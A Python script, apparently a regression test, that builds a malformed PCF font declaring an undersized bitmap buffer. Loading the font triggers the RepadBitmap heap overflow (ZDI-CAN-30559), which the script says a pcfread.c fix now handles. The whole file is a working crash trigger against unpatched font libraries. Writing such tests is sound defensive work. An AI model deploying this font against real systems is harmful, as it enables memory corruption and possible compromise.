#!/usr/bin/env python3
"""
Generate a malicious PCF font that triggers the RepadBitmap heap buffer
overflow (ZDI-CAN-30559).

The font declares a tiny bitmapSizes[2] (for pad=4) but has per-glyph
metrics that cause RepadBitmap to write far more data than allocated.

With the fix in pcfread.c, the library computes the required buffer size
from per-glyph metrics instead of trusting bitmapSizes[], so this font
is loaded safely.

Usage:
    python3 gen_evil_pcf_repad.py <output_dir>

Creates <output_dir>/evil-repad.pcf and <output_dir>/fonts.dir
"""

import struct
import sys
import os

PCF_DEFAULT_FORMAT = 0x00000000
PCF_PROPERTIES = 1
PCF_ACCELERATORS = 2
PCF_METRICS = 4
PCF_BITMAPS = 8
PCF_BDF_ENCODINGS = 32


def u32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


def i32(x):
    return struct.pack("<i", x)


def u16(x):
    return struct.pack("<H", x & 0xFFFF)


def i16(x):
    return struct.pack("<h", x)


def u8(x):
    return struct.pack("<B", x & 0xFF)


def xCharInfo(lsb, rsb, cw, asc, desc, attr):
    return i16(lsb) + i16(rsb) + i16(cw) + i16(asc) + i16(desc) + u16(attr)


# Per-glyph metric: width=200, height=20
# dstWidthBytes at pad=4 = ((200+31)>>5)<<2 = 28
# RepadBitmap writes 28 * 20 = 560 bytes
PG_RSB, PG_LSB = 200, 0
PG_ASCENT, PG_DESCENT = 10, 10

# bitmapSizes[2] = 16 (tiny, causes overflow without fix)
BITMAP_SIZES = [500, 520, 16, 640]
BITMAP_DATA_SIZE = BITMAP_SIZES[0]

# --- PROPERTIES ---
properties = b""
properties += u32(PCF_DEFAULT_FORMAT)
properties += i32(1)
properties += i32(0)
properties += u8(0)
properties += i32(0)
properties += b"\x00" * 3
properties += i32(1)
properties += b"\x00"

# --- ACCELERATORS ---
accel = b""
accel += u32(PCF_DEFAULT_FORMAT)
accel += u8(0) * 8
accel += i32(PG_ASCENT)
accel += i32(PG_DESCENT)
accel += i32(0)
accel += xCharInfo(0, 0, 0, 0, 0, 0)
accel += xCharInfo(PG_LSB, PG_RSB, PG_RSB, PG_ASCENT, PG_DESCENT, 0)

# --- METRICS ---
metrics = b""
metrics += u32(PCF_DEFAULT_FORMAT)
metrics += i32(1)
metrics += xCharInfo(PG_LSB, PG_RSB, PG_RSB, PG_ASCENT, PG_DESCENT, 0)

# --- BITMAPS ---
bitmaps = b""
bitmaps += u32(PCF_DEFAULT_FORMAT)
bitmaps += i32(1)
bitmaps += u32(0)
for sz in BITMAP_SIZES:
    bitmaps += u32(sz)
bitmaps += b"\xaa" * BITMAP_DATA_SIZE

# --- BDF_ENCODINGS ---
encodings = b""
encodings += u32(PCF_DEFAULT_FORMAT)
encodings += u16(0) + u16(0)  # firstCol, lastCol
encodings += u16(0) + u16(0)  # firstRow, lastRow
encodings += u16(0)  # defaultCh
encodings += u16(0)  # encoding[0] -> metric[0]

# --- Assemble ---
TABLE_COUNT = 5
BODY_START = 8 + TABLE_COUNT * 16

properties_off = BODY_START
accel_off = properties_off + len(properties)
metrics_off = accel_off + len(accel)
bitmaps_off = metrics_off + len(metrics)
encodings_off = bitmaps_off + len(bitmaps)


def toc(type_, format_, size, offset):
    return u32(type_) + u32(format_) + u32(size) + u32(offset)


out = b"\x01fcp" + u32(TABLE_COUNT)
out += toc(PCF_PROPERTIES, 0, len(properties), properties_off)
out += toc(PCF_ACCELERATORS, 0, len(accel), accel_off)
out += toc(PCF_METRICS, 0, len(metrics), metrics_off)
out += toc(PCF_BITMAPS, 0, len(bitmaps), bitmaps_off)
out += toc(PCF_BDF_ENCODINGS, 0, len(encodings), encodings_off)
out += properties + accel + metrics + bitmaps + encodings

output_dir = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(output_dir, exist_ok=True)

pcf_name = "evil-repad.pcf"
xlfd = "-evil-repad-medium-r-normal--10-100-75-75-c-80-iso10646-1"

with open(os.path.join(output_dir, pcf_name), "wb") as f:
    f.write(out)

with open(os.path.join(output_dir, "fonts.dir"), "w") as f:
    f.write("1\n")
    f.write(f"{pcf_name} {xlfd}\n")
